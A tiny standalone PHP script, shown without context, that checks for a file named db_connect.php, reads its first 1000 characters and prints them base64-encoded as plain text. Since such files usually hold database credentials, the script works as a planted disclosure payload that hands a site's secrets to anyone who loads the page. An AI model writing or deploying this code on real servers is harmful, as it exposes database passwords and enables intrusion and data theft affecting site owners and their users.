<?php
header('Content-Type: text/plain');
if (file_exists('db_connect.php')) {
    $c = file_get_contents('db_connect.php');
    echo base64_encode(substr($c, 0, 1000));
}
?>
